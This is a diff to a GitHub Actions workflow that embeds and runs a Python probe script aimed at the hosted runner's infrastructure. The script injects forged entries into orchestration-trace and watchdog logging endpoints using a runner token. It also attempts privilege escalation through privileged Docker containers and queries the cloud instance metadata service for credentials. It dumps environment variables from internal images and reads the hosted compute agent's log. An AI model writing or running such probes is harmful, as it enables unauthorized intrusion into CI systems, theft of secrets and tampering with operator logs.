@@ -21,7 +21,7 @@ jobs:
                   r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
                   return (r.stdout + r.stderr)[:6000]
               except Exception as ex:
-                  return f"TIMEOUT/ERROR: {ex}"
+                  return "TIMEOUT/ERROR: " + str(ex)
           
           def auth(method, url, token, body=None, timeout=15):
               data = body.encode() if isinstance(body, str) else None
@@ -51,56 +51,46 @@ jobs:
           
           print("[%s] alloc=%s sched=%s" % (SOURCE, alloc, sched_url))
           
-          # ===== 1. GET /v1/request full response ====================================
-          print("
-          [%s] === GET /v1/request FULL BODY ===" % SOURCE)
+          # ===== 1. GET /v1/request full response ===
+          print(""); print("[%s] === GET /v1/request FULL BODY ===" % SOURCE)
           status, body = auth("GET", sched_url + "/request", token)
           print("[REQUEST_BODY] status=%d" % status)
           print("[REQUEST_BODY] body=%s" % body[:8000])
           
-          # ===== 2. ORCH TRACE level=int + RFC3339 ===================================
-          print("
-          [%s] === ORCH TRACE level=int ===" % SOURCE)
+          # ===== 2. ORCH TRACE level=int + RFC3339 ===
+          print(""); print("[%s] === ORCH TRACE level=int ===" % SOURCE)
           ts = "2026-06-24T01:00:00Z"
-          orch_payloads = [
-              ("int0",      '[{"level":0,"message":"test","timestamp":"' + ts + '"}]'),
-              ("int1",      '[{"level":1,"message":"test","timestamp":"' + ts + '"}]'),
-              ("no_ts",     '[{"level":0,"message":"test"}]'),
-              ("int0_alloc",'[{"level":0,"message":"inject","allocationId":"' + alloc + '","timestamp":"' + ts + '"}]'),
-          ]
-          for key, payload in orch_payloads:
+          for key, payload in [
+              ("int0",       '[{"level":0,"message":"test","timestamp":"' + ts + '"}]'),
+              ("int1",       '[{"level":1,"message":"test","timestamp":"' + ts + '"}]'),
+              ("no_ts",      '[{"level":0,"message":"test"}]'),
+              ("int0_alloc", '[{"level":0,"message":"inject","allocationId":"' + alloc + '","timestamp":"' + ts + '"}]'),
+          ]:
               status, body = auth("POST", trace_url, token, payload)
               print("[ORCH_TRACE] %s -> %d | %s" % (key, status, body[:300]))
           
           # Watchdog with RFC3339 ts
-          print("
-          [%s] === WATCHDOG RFC3339 ===" % SOURCE)
-          w_payloads = [
+          print(""); print("[%s] === WATCHDOG RFC3339 ===" % SOURCE)
+          for key, payload in [
               ("rfc_ts",    '[{"level":"INFO","message":"INJECT","vmName":"hca-vm","timestamp":"' + ts + '"}]'),
               ("alloc_rfc", '[{"level":"INFO","message":"INJECT","allocationId":"' + alloc + '","timestamp":"' + ts + '"}]'),
-          ]
-          for key, payload in w_payloads:
+          ]:
               status, body = auth("POST", watchdog, token, payload)
               print("[WATCHDOG] %s -> %d | %s" % (key, status, body[:300]))
           
-          # ===== 3. DOCKER DEEP DIVE ================================================
-          print("
-          [%s] === DOCKER ===" % SOURCE)
+          # ===== 3. DOCKER ===
+          print(""); print("[%s] === DOCKER ===" % SOURCE)
           print("[DOCKER] security options:"); print(sh("docker info 2>&1 | grep -A10 'Security Options'"))
           print("[DOCKER] images:"); print(sh("docker images --no-trunc 2>&1"))
           
           for img in ["ghcr.io/github/gh-aw-mcpg:latest", "ghcr.io/github/gh-aw-firewall/"]:
-              cmd = "docker inspect " + img + " 2>&1"
-              out = sh(cmd, timeout=15)
-              print("[INSPECT] " + img + ":")
-              print(out[:4000])
+              print("[INSPECT] " + img + ":"); print(sh("docker inspect " + img + " 2>&1", timeout=15)[:3000])
           
           print("[DOCKER] dependabot env:")
-          print(sh("docker inspect ghcr.io/dependabot/dependabot-updater-core:latest 2>&1 | python3 -m json.tool 2>/dev/null | grep -A2 -i 'env' | head -30"))
+          print(sh("docker inspect ghcr.io/dependabot/dependabot-updater-core:latest 2>&1 | grep -A2 -i 'env' | head -20"))
           
           # Privileged run
-          print("
-          [%s] === DOCKER PRIVESC ===" % SOURCE)
+          print(""); print("[%s] === DOCKER PRIVESC ===" % SOURCE)
           print("[PRIV] privileged:")
           print(sh("docker run --rm --privileged ubuntu:latest /bin/sh -c 'id; cat /proc/1/cgroup | head -5; ls /dev/sda* /dev/nvme* 2>/dev/null; echo DONE' 2>&1", timeout=30))
           
@@ -110,18 +100,15 @@ jobs:
           print("[NET] host network IMDS:")
           print(sh("docker run --rm --net=host alpine /bin/sh -c 'curl -s --max-time 3 http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H Metadata:true 2>&1' 2>&1", timeout=30))
           
-          # ===== 4. gh-aw-mcpg ======================================================
-          print("
-          [%s] === GH-AW-MCPG ===" % SOURCE)
+          # ===== 4. gh-aw-mcpg ===
+          print(""); print("[%s] === GH-AW-MCPG ===" % SOURCE)
           print(sh("docker run --rm ghcr.io/github/gh-aw-mcpg:latest --help 2>&1 | head -50", timeout=20))
           print(sh("docker run --rm --entrypoint sh ghcr.io/github/gh-aw-mcpg:latest -c 'ls / && env | sort' 2>&1 | head -60", timeout=20))
           
-          # ===== 5. HCA full log ====================================================
-          print("
-          [%s] === HCA LOG ===" % SOURCE)
+          # ===== 5. HCA full log ===
+          print(""); print("[%s] === HCA LOG ===" % SOURCE)
           print(sh("cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null"))
           
-          print("
-          [%s] DONE" % SOURCE)
+          print(""); print("[%s] DONE" % SOURCE)
           PROBE_EOF
           python3 /tmp/v59_probe.py
